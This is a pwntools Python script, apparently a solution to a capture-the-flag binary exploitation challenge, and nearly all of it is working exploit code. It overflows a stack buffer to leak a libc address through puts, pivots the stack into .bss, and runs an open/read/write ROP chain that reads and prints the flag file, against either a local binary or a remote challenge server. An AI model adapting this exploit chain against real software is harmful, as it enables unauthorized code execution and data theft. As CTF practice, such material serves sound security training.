#!/usr/bin/python3
# -*- encoding: utf-8 -*-

from pwn import *

#context(os = 'linux', arch = 'amd64', log_level = 'debug')
context(os = 'linux', arch = 'amd64', log_level = 'debug')
#context.terminal = ['tmux', 'splitw', '-h']

file_name = "./vuln"
elf = ELF(file_name)
libc1 = elf.libc
# add ="nc1.ctfplus.cn"
#add = "127.0.0.1"
# port = 39169
# break_point = "b *0x0000000004012E8"
choice = 0
if choice == 0 :
    p = process(file_name)
    # gdb.attach(p,break_point)
else :
    p = remote("pwn-9c0d5a73b7.challenge.xctf.org.cn", 9999, ssl=True)

#-----------------------------------------------------------------------------------------
rv = lambda x            : p.recv(x)
rl = lambda a=False      : p.recvline(a)
ru = lambda a,b=True     : p.recvuntil(a,b)
rn = lambda x            : p.recvn(x)
sd = lambda x            : p.send(x)
sl = lambda x            : p.sendline(x)
sa = lambda a,b          : p.sendafter(a,b)
sla = lambda a,b         : p.sendlineafter(a,b)
#u32 = lambda             : u32(p.recv(4).ljust(4,b'\x00'))
#u64 = lambda             : u64(p.recv(6).ljust(8,b'\x00'))
inter = lambda           : p.interactive()
debug = lambda text=None : gdb.attach(p, text)
lg = lambda s,addr       : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
pad = lambda a,b           : print("[+]{} --->".format(a),hex(b))
#-----------------------------------------------------------------------------------------

rdi = 0x0000000000401393
ret = 0x000000000040101a
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
vuln = 0x00000000004012C4

ru("lets move and pwn!\n")
sd(b'a'*0x100+p64(0)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)+b'\x00'*0x8)
libc = u64(rv(6)+b'\x00\x00')-(0x7f93b4bb3420-0x7f93b4b2f000)
pad("libc",libc)

open_addr = libc + libc1.sym["open"]
read = libc + 0x00000000010DFC0
write = libc + 0x000000000010E060
bss = 0x000000000404090+8
rsi = 0x000000000002601f+libc
rdx = 0x0000000000142c92+libc
leave = 0x00000000000578c8 + libc

sd(b'a'*0x100+p64(bss+8)+p64(rsi)+p64(bss)+p64(read)+p64(leave)+p64(0))
payload = p64(rdi)+p64(bss)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(open_addr)
payload += p64(rdi)+p64(3)+p64(rsi)+p64(bss+0x200)+p64(rdx)+p64(0x50)+p64(read)
payload += p64(rdi)+p64(1)+p64(rsi)+p64(bss+0x200)+p64(rdx)+p64(0x50)+p64(write)
sd(b'./flag\x00\x00/bin/sh\x00'+payload.ljust(0x120,b'\x00'))

inter()
